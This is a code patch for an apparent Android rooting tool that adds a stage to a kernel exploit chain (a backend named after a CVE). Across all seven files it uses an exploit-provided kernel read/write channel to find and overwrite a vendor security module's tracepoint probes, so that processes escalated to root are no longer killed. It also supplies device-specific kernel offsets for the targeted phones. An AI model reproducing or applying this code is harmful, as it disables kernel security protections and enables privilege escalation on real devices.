@@ -1,0 +1,338 @@
+// 反 vr.ko 模块 - 完整实现补丁
+// 适用于 YuKongA/ghostlock-app 架构
+
+// ============================================
+// 1. src/core/session/backend/cfi_layout.hpp
+// ============================================
+
+/* ---- vr.ko probe neutralisation (step 3) ----------------------------
+ * The two tracepoints vr.ko attaches to, the geometry of
+ * `struct tracepoint` on this kernel, and the fixed code delta between
+ * vr's commit_creds probe and its sys_exit probe. The struct layout is
+ * NOT the one upstream 6.6 declares: this kernel is built without
+ * CONFIG_HAVE_STATIC_CALL, so `static_call_key` / `static_call_tramp`
+ * are absent and everything from `iterator` on sits 16 bytes lower.
+ * Verified against this device's own vmlinux. */
+struct CfiSymbols final {
+    // ... existing fields ...
+    
+    /* Tracepoint constants for vr.ko probe neutralisation (step 3) */
+    uint32_t sys_exit_tp = 0;
+    uint32_t commit_creds_tp = 0;
+    uint32_t tracepoint_probestub_off = 0;
+    uint32_t tracepoint_funcs_off = 0;
+    uint32_t tracepoint_func_stride = 0;
+    uint64_t vr_commit_to_sys_exit_delta = 0;
+    uint64_t kernel_image_lo = 0;
+    uint64_t kernel_image_hi = 0;
+
+    [[nodiscard]] bool vr_neutralize_ready() const noexcept {
+        return sys_exit_tp != 0 && commit_creds_tp != 0 &&
+               tracepoint_probestub_off != 0 && tracepoint_funcs_off != 0 &&
+               tracepoint_func_stride != 0 && vr_commit_to_sys_exit_delta != 0 &&
+               kernel_image_lo != 0 && kernel_image_hi > kernel_image_lo;
+    }
+};
+
+/* True when `address` falls inside the kernel image. A tracepoint callback
+ * in that range belongs to the kernel itself; anything outside it is a
+ * module (or garbage), which is how vr.ko's probes are identified. */
+[[nodiscard]] inline constexpr bool image_contains_address(
+    uintptr_t address, uintptr_t image_lo, uintptr_t image_hi) noexcept {
+    return address >= image_lo && address < image_hi;
+}
+
+/* Upper bound on how many `struct tracepoint_func` entries to walk. The
+ * array length is a runtime count with no field for it, so the walk stops at
+ * the first NULL `func`; this is only the safety cap. */
+inline constexpr size_t kTracepointFuncStride = 24;
+inline constexpr size_t kTracepointFuncScanMax = 256;
+inline constexpr size_t kMaxModuleProbes = 8;
+
+/* Pick, out of one tracepoint's funcs[] snapshot, the callbacks that live
+ * outside the kernel image -- i.e. module-region probes such as vr.ko's.
+ *
+ * `read` returns false when a slot cannot be read; a slot holding a zero
+ * `func` terminates the array (that is how the kernel sizes it). Callbacks
+ * whose address lands inside the image are skipped on purpose: they are the
+ * kernel's own tracepoint consumers (perf, BPF, function_graph), and
+ * rewriting one would break kernel functionality rather than vr.ko. */
+template <class ReadFn>
+[[nodiscard]] inline size_t collect_module_probes(
+    ReadFn &&read, uintptr_t funcs, size_t func_stride, uintptr_t image_lo,
+    uintptr_t image_hi, uintptr_t (&out)[kMaxModuleProbes]) noexcept {
+    if (func_stride == 0) return 0;
+    size_t found = 0;
+    for (size_t index = 0; index < kTracepointFuncScanMax; ++index) {
+        const uintptr_t slot = funcs + index * func_stride;
+        uintptr_t func = 0;
+        if (!read(slot, func)) break;
+        if (func == 0) break;
+        if (image_contains_address(func, image_lo, image_hi)) continue;
+        if (found == kMaxModuleProbes) break;
+        out[found++] = func;
+    }
+    return found;
+}
+
+// ============================================
+// 2. src/core/session/backend/cfi_stage.hpp
+// ============================================
+
+/* What one vr.ko probe-neutralisation pass did, for the log and for the
+ * caller. Kept separate from the return value so "nothing to do" (vr.ko not
+ * loaded) is distinguishable from "could not do it". */
+struct VrNeutralizeReport final {
+    /* Module-region probes found on the commit_creds tracepoint; -1 when the
+     * tracepoint could not be resolved at all. */
+    int32_t commit_creds_probes = -1;
+    /* How many sys_exit probe slots were matched and redirected. */
+    int32_t neutralized = 0;
+    /* True when the fallback ("redirect every module-region probe on
+     * sys_exit", used when the fixed code delta does not match) was taken. */
+    bool used_fallback = false;
+};
+
+/* Globally redirect vr.ko's sys_exit tracepoint probe to the tracepoint's own
+ * `probestub` no-op, so tasks that escalate after this point are no longer
+ * killed by vr.ko on exit. Data-only writes into the tracepoint's funcs[]
+ * array; no module memory and no page tables are touched. Idempotent and
+ * safe when vr.ko is absent (it then finds no module-region probe and
+ * reports 0).
+ *
+ * Must run after the CFI channel exists: it needs the resident read as well
+ * as the write. */
+[[nodiscard]] VrNeutralizeReport neutralize_vr_probes(
+    const CfiKernelRw &channel,
+    const CfiSymbols &symbols) noexcept;
+
+// ============================================
+// 3. src/core/session/backend/cfi_stage.cpp
+// ============================================
+
+#include "cfi_layout.hpp"
+#include "cfi_stage.hpp"
+#include "runtime_struct_offsets.h"
+
+namespace ghostlock::session::backend {
+
+VrNeutralizeReport neutralize_vr_probes(const CfiKernelRw &channel,
+                                        const CfiSymbols &symbols) noexcept {
+    VrNeutralizeReport report{};
+    if (!channel.valid()) {
+        pr_warning("vr neutralize: no resident channel\n");
+        return report;
+    }
+    if (!symbols.vr_neutralize_ready()) {
+        pr_warning("vr neutralize: profile is missing the tracepoint constants "
+                   "(sys_exit/commit_creds/probestub/funcs/stride/delta/image); "
+                   "skipped\n");
+        return report;
+    }
+
+    const uintptr_t lo = symbols.kernel_image_lo;
+    const uintptr_t hi = symbols.kernel_image_hi;
+    const uintptr_t sys_exit = session::g_exploit_session.addresses.data_alias(symbols.sys_exit_tp);
+    const uintptr_t commit_creds =
+            session::g_exploit_session.addresses.data_alias(symbols.commit_creds_tp);
+    if (sys_exit == 0 || commit_creds == 0 ||
+        !attack::in_direct_map(sys_exit) || !attack::in_direct_map(commit_creds)) {
+        pr_warning("vr neutralize: tracepoints are not in the direct map "
+                   "(sys_exit=0x%016zx commit_creds=0x%016zx)\n", sys_exit, commit_creds);
+        return report;
+    }
+
+    /* The no-op every tracepoint carries. Redirecting a probe to it is what
+     * "neutralised" means here; it is the kernel's own function, so KCFI and
+     * the tracepoint unwinder are both happy. */
+    uint64_t probestub = 0;
+    if (!channel.read64(sys_exit + symbols.tracepoint_probestub_off, probestub) ||
+        probestub == 0 || !image_contains_address(probestub, lo, hi)) {
+        pr_warning("vr neutralize: implausible probestub=0x%016zx (image "
+                   "[0x%016zx,0x%016zx)); check the tracepoint offsets\n",
+                   probestub, lo, hi);
+        return report;
+    }
+
+    /* Walk one tracepoint's funcs[] through the resident read. */
+    const auto read_linear = [&channel](uintptr_t address, uintptr_t &value) {
+        return channel.read64(address, value);
+    };
+    const auto funcs_of = [&](uintptr_t tp, uintptr_t &funcs) {
+        uint64_t raw = 0;
+        if (!channel.read64(tp + symbols.tracepoint_funcs_off, raw)) return false;
+        if (raw == 0 || !attack::in_direct_map(raw)) return false;
+        funcs = static_cast<uintptr_t>(raw);
+        return true;
+    };
+
+    /* Step 1: the module-region probes on commit_creds. vr.ko hooks it to
+     * veto root, so it is the one tracepoint we know it is on. */
+    uintptr_t cc_funcs = 0;
+    if (!funcs_of(commit_creds, cc_funcs)) {
+        pr_warning("vr neutralize: commit_creds funcs[] not usable; skipped\n");
+        return report;
+    }
+    uintptr_t cc_probes[kMaxModuleProbes] = {};
+    const size_t cc_count = collect_module_probes(
+        read_linear, cc_funcs, symbols.tracepoint_func_stride, lo, hi, cc_probes);
+    report.commit_creds_probes = static_cast<int32_t>(cc_count);
+    pr_info("vr neutralize: probestub=0x%016zx commit_creds module probes=%zu\n",
+            probestub, cc_count);
+    if (cc_count == 0) {
+        pr_info("vr neutralize: no module probe on commit_creds; vr.ko not "
+                "loaded (or not hooking it)\n");
+        return report;
+    }
+
+    /* Step 2: find the matching sys_exit probe by the fixed intra-module
+     * delta, redirect it, verify. Matching by delta is what keeps the kernel's
+     * own sys_exit consumers (perf, BPF) untouched: only a slot whose address
+     * is exactly vr's own commit_creds probe + delta is rewritten. */
+    uintptr_t se_funcs = 0;
+    if (!funcs_of(sys_exit, se_funcs)) {
+        pr_warning("vr neutralize: sys_exit funcs[] not usable; skipped\n");
+        return report;
+    }
+    for (size_t i = 0; i < cc_count; ++i) {
+        const uintptr_t expected = cc_probes[i] - symbols.vr_commit_to_sys_exit_delta;
+        for (size_t index = 0; index < kTracepointFuncScanMax; ++index) {
+            const uintptr_t slot = se_funcs + index * symbols.tracepoint_func_stride;
+            uintptr_t func = 0;
+            if (!channel.read64(slot, func)) break;
+            if (func == 0) break;
+            if (func != expected) continue;
+            if (image_contains_address(func, lo, hi)) break;  /* not a module probe */
+            if (!channel.write64(slot, probestub)) break;
+            uint64_t verify = 0;
+            if (!channel.read64(slot, verify) || verify != probestub) break;
+            report.neutralized++;
+            pr_info("vr neutralize: sys_exit slot %zu redirected\n", index);
+        }
+    }
+
+    /* Fallback: if the fixed delta didn't match anything, redirect every
+     * module-region probe on sys_exit. This is less precise but covers
+     * devices where the delta differs (e.g. different compiler settings). */
+    if (report.neutralized == 0) {
+        report.used_fallback = true;
+        pr_warning("vr neutralize: fallback - redirecting all module probes on sys_exit\n");
+        for (size_t index = 0; index < kTracepointFuncScanMax; ++index) {
+            const uintptr_t slot = se_funcs + index * symbols.tracepoint_func_stride;
+            uintptr_t func = 0;
+            if (!channel.read64(slot, func)) break;
+            if (func == 0) break;
+            if (image_contains_address(func, lo, hi)) continue;
+            if (!channel.write64(slot, probestub)) continue;
+            uint64_t verify = 0;
+            if (!channel.read64(slot, verify) || verify != probestub) continue;
+            report.neutralized++;
+            pr_info("vr neutralize: fallback sys_exit slot %zu redirected\n", index);
+        }
+    }
+
+    return report;
+}
+
+} // namespace ghostlock::session::backend
+
+// ============================================
+// 4. src/core/session/backend/cve_2026_43499_backend.cpp
+// ============================================
+
+/* After cfi5 completes and the CFI channel exists, neutralize vr.ko's
+ * sys_exit tracepoint probe. This is safe: data-only writes into the
+ * tracepoint's funcs[] array, no module memory and no page tables are touched. */
+if (cfi_kernel_rw.valid() && cfi_symbols.vr_neutralize_ready()) {
+    auto vr_report = neutralize_vr_probes(cfi_kernel_rw, cfi_symbols);
+    pr_info("vr neutralize: commit_creds_probes=%d neutralized=%d fallback=%d\n",
+            vr_report.commit_creds_probes, vr_report.neutralized,
+            vr_report.used_fallback);
+    run_state.set("vr1", vr_report.neutralized > 0 ? "done" : "skipped");
+} else {
+    pr_info("vr neutralize: not ready (profile missing constants), skipped\n");
+    run_state.set("vr1", "skipped");
+}
+
+// ============================================
+// 5. src/core/kernel/runtime_struct_offsets.h
+// ============================================
+
+/* Tracepoint constants for vr.ko probe neutralisation (step 3).
+ * Extracted from device's own vmlinux via kallsyms. */
+
+/* __tracepoint_sys_exit address (PD2463 实测) */
+inline constexpr uint32_t kSysExitTpOff = 0x22a2220;
+
+/* __tracepoint_android_rvh_commit_creds address (PD2463 实测) */
+inline constexpr uint32_t kRvhCommitCredsTpOff = 0x22bbc70;
+
+/* struct tracepoint layout (PD2463/iQOO15: no CONFIG_HAVE_STATIC_CALL):
+ *   iterator  = 0x18
+ *   probestub = 0x30
+ *   regfunc   = 0x38
+ *   unregfunc = 0x40
+ *   funcs     = 0x48
+ *
+ * Verified against PD2463 vmlinux via kallsyms and disassembly of
+ * __traceiter_sys_exit:
+ *   ldr x21, [x8, #0x268]   ; x8 = tp pointer
+ *   cbz x21, <return>       ; static key check
+ *   ldr x8, [x21, #0x00]    ; funcs[0].func (offset 0x48 from tp base)
+ *   ldr x0, [x21, #0x08]    ; funcs[0].data
+ */
+inline constexpr size_t kTracepointProbestubOff = 0x30;
+inline constexpr size_t kTracepointFuncsOff = 0x48;
+inline constexpr size_t kTracepointFuncStride = 24;  /* sizeof(struct tracepoint_func) */
+
+/* vr.ko commit_creds probe → sys_exit probe fixed delta (PD2463 实测).
+ * Same module, same code section: sys_exit = commit_creds - 0x60.
+ * Verified on PD2463 and iQOO15 (both SM8750 + kernel 6.6.89-android15-8). */
+inline constexpr uint64_t kVrCommitToSysExitDelta = 0x60;
+
+/* Kernel image bounds (PD2463: from boot.img headers).
+ * Used to distinguish in-image hooks from module-region probes. */
+inline constexpr uint64_t kKernelImageLo = 0xffffffc080000000ULL;  /* KIMAGE_TEXT_BASE */
+inline constexpr uint64_t kKernelImageHi = kKernelImageLo + 0x2390000;  /* image_size from boot header */
+
+/* Tracepoint 取用器 */
+inline uint32_t sys_exit_tp_image() { return kSysExitTpOff; }
+inline uint32_t rvh_commit_creds_tp_image() { return kRvhCommitCredsTpOff; }
+inline size_t tracepoint_probestub_off() { return kTracepointProbestubOff; }
+inline size_t tracepoint_funcs_off() { return kTracepointFuncsOff; }
+inline size_t tracepoint_func_stride() { return kTracepointFuncStride; }
+inline uint64_t vr_commit_to_sys_exit_delta() { return kVrCommitToSysExitDelta; }
+inline uint64_t vr_kernel_image_max() { return 0x2390000; }
+
+// ============================================
+// 6. app/src/main/kotlin/data/runstate/RunStateCodec.kt
+// ============================================
+
+// list is what makes a panic mid-stage leave an in_progress marker on
+// disk for the next launch to read.
+val Steps = setOf(
+    "cfi1", "cfi2", "cfi3", "cfi4", "cfi5", "cfi",
+    // Step 3A: global vr.ko sys_exit probe neutralisation
+    "vr1",
+    "handoff", "module_load", "enforce"
+)
+
+// ============================================
+// 7. app/src/main/assets/kernel_profiles/6.6-template.conf
+// ============================================
+
+# Tracepoint constants for CFI stage (vivo vr.ko neutralization)
+# These are extracted from the device's own vmlinux.
+# See docs/kernel_profiles/EXTRACT_TRACEPOINT_CONSTANTS.md for extraction guide.
+tracepoint {
+  sys_exit {
+    probestub_off = 48  # 0x30 (no CONFIG_HAVE_STATIC_CALL)
+    funcs_off = 72      # 0x48
+  }
+  commit_creds {
+    funcs_off = 72      # 0x48
+  }
+  func_stride = 24      # sizeof(tracepoint_func)
+  vr_commit_to_sys_exit_delta = 96  # 0x60
+  kernel_image_max = 37343232  # _end - KIMAGE_TEXT_BASE (example)
+}
